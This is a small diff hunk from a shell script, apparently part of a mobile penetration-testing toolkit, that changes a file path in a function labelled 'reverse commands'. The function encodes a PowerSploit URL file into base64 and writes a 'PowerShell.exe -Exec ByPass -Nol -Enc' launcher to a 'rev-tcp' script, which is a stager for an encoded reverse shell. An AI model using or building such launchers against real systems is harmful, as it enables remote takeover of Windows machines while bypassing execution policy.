@@ -17,7 +17,7 @@ fi
 # REVERSE COMMANDS
 
 f_reverse(){
-encode="`cat /data/local/nhsystem/kali-armhf/var/www/html/powersploit-url | /usr/bin/iconv --to-code UTF-16LE | /usr/bin/base64 -w 0`"
+encode="`cat /var/www/html/powersploit-url | /usr/bin/iconv --to-code UTF-16LE | /usr/bin/base64 -w 0`"
 command=" PowerShell.exe -Exec ByPass -Nol -Enc $encode"
 echo " $command" >/sdcard/nh_files/scripts/rev-tcp
 }
